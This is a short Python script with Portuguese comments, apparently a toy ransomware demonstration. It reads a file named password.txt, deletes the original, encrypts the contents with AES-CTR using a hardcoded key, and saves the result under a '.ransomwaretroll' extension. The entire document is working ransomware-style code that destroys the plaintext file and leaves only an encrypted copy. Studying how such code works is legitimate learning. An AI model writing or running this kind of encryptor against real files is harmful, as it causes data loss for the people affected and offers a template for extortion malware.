import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "./password.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

## chave de criptografia
key = b"decrypt123456789"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = f'{file_name}.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()